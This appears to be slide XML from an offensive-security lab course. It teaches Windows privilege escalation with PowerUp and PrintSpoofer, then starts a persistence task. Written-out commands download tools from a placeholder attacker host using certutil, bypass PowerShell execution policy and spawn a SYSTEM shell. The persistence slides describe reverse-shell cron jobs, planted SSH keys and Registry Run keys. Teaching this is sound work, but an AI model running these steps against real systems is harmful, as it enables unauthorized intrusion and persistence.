            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -split -f http://&lt;KALI_IP&gt;:8000/PowerUp.ps1 PowerUp.ps1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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rgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -ep bypass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48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7590971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latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔹 Step 2 — Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>PowerUp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Done on: Windows Target Machine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1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>If script execution is blocked for your current session, allow it temporarily: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solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>  Set-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ExecutionPolicy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Bypass -Scope Process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>
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>   . .\PowerUp.ps1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+mj-lt"/>
              </a:rPr>
              <a:t>Run the check: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solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>UnquotedService</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>You can also run the broader audit:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="+mj-lt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>
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>AllChecks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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 err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -ep bypass</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>. .\PowerUp.ps1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>AllChecks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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+mj-lt"/>
              </a:rPr>
              <a:t>Focused check</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>UnquotedService</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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700" dirty="0"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300686" y="975196"/>
            <a:ext cx="4078514" cy="378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🔍 What </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>PowerUp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Does</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="+mj-l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+mj-lt"/>
              </a:rPr>
              <a:t>Performs privilege escalation checks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+mj-lt"/>
              </a:rPr>
              <a:t>Focuses on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Windows misconfigurations</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt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+mj-lt"/>
              </a:rPr>
              <a:t>Gives </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>clear abuse suggestions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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+mj-lt"/>
              </a:rPr>
              <a:t>🎯</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt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+mj-lt"/>
              </a:rPr>
              <a:t>Key Findings to Identify</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
              <a:latin typeface="+mj-l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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔴</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Unquoted Service Paths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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔴</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Weak Service Permissions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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔴</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Auto-run services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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔴 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Credential leaks </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3342850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>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>What the output means</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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+mj-lt"/>
              </a:rPr>
              <a:t>A potentially vulnerable example would look like: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 err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ServiceName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ExampleService</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Path        : C:\Program Files\Example App\service.exe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+mj-lt"/>
              </a:rPr>
              <a:t>That is interesting because the path has spaces and is not quoted.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+mj-lt"/>
              </a:rPr>
              <a:t>A non-issue would look like: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+mj-lt"/>
              </a:rPr>
              <a:t>Path        : "C:\Program Files\Example App\service.exe"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latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Manual cross-check</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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+mj-lt"/>
              </a:rPr>
              <a:t>You can also verify services manually with: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 err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>wmic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> service get </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>name,displayname,pathname,startmode</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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+mj-lt"/>
              </a:rPr>
              <a:t>or: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 err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>sc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> qc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ServiceName</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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+mj-lt"/>
              </a:rPr>
              <a:t>Then inspect the BINARY_PATH_NAME.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1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7778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What you do at this stage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At this step, you are only:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>enumerating services </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>identifying unquoted paths </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>noting the service name, binary path, and run account </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>You are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>not yet exploiting anything</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt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+mj-lt"/>
              </a:rPr>
              <a:t>Very important note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Finding an unquoted service path </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>alone is not enough</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>. For it to become a real privilege-escalation path, you usually also need </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>write permissions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> in a relevant directory location. So after finding one, the next check is whether the current user can write somewhere in that path chain.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An unquoted service path becomes exploitable only if the attacker has write permissions in one of the directories in the path.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3214442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733143" cy="65786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+mj-lt"/>
              </a:rPr>
              <a:t>Part 3  Token Impersonation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+mj-lt"/>
              </a:rPr>
              <a:t>Step 1 — Enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Ran </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>WinPEAS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>PowerUp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt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en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Identified: 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+mj-lt"/>
              </a:rPr>
              <a:t>Unquoted service paths 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+mj-lt"/>
              </a:rPr>
              <a:t>Weak permissions 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+mj-lt"/>
              </a:rPr>
              <a:t>Registry credentials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+mj-lt"/>
              </a:rPr>
              <a:t>On windows 7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+mj-lt"/>
              </a:rPr>
              <a:t>Run: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 err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>whoami</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>priv</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1600" dirty="0"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+mj-lt"/>
              </a:rPr>
              <a:t>🎯 If you see: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 err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>SeImpersonatePrivilege</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Enabled it means that it is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>high-risk misconfiguration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
              <a:latin typeface="+mj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12800" y="1415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86284" y="228600"/>
            <a:ext cx="5805716" cy="4204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7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>👉 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>This unlocks </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>instant SYSTEM path</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US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👉 You can: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Impersonate SYSTEM token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Spawn a SYSTEM shell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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Step 2 — If vulnerable → bring tool</a:t>
            </a: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From Kali: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python3 -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> 8000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On Windows (inside our </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> terminal):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+mj-lt"/>
              </a:rPr>
              <a:t>certutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>urlcache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -f http://&lt;KALI-IP&gt;:8000/PrintSpoofer.exe PrintSpoofer.exe</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37106698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5143"/>
            <a:ext cx="11353800" cy="603182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+mj-lt"/>
              </a:rPr>
              <a:t>Step 3 — Execute </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>PrintSpoofer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt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+mj-lt"/>
              </a:rPr>
              <a:t>PrintSpoofer.exe -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -c </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>cmd</a:t>
            </a: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What happens internally (important for students):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Tool tricks a privileged service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Captures SYSTEM token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Impersonates it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Launches new process as SYSTEM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1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+mj-lt"/>
              </a:rPr>
              <a:t>Step 4 — Verify</a:t>
            </a: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+mj-lt"/>
              </a:rPr>
              <a:t>whoami</a:t>
            </a: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+mj-lt"/>
              </a:rPr>
              <a:t>nt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> authority\system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37631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6337300"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Task 03</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="513374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365125"/>
            <a:ext cx="11353799" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Task 03: Establishing Persistence (Don’t Lose the Shell)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825624"/>
            <a:ext cx="11353800" cy="4613275"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: Ensure that you can get back into the system even if the victim reboots or the connection drops.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Technical Requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: Create a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Cron</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> job that sends a reverse shell every hour, or add your own SSH public key to the ~/.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>authorized_keys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> file.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: Create a Scheduled Task or add a malicious entry to the</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Registry Run Keys</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>(HKCU\Software\Microsoft\Windows\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CurrentVersion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>\Run).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Learning Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: Understand how real-world APTs (Advanced Persistent Threats) stay inside a network for months.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2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629071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6545942" cy="672011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+mj-lt"/>
              </a:rPr>
              <a:t>Part 1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+mj-lt"/>
              </a:rPr>
              <a:t>On Linux, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>cron</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> is like: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+mj-lt"/>
              </a:rPr>
              <a:t>“Run this command automatically at a specific time”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="19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latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Method 1 — SSH Key Persistence (Stealth &amp; Reliable)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="19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latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Step 1 — Generate Key (Attacker Machine)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="19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 err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ssh-keygen</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -t </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>rsa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -b 2048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+mj-lt"/>
              </a:rPr>
              <a:t>You’ll see something like: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+mj-lt"/>
              </a:rPr>
              <a:t>Enter file in which to save the key (/home/kali/.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
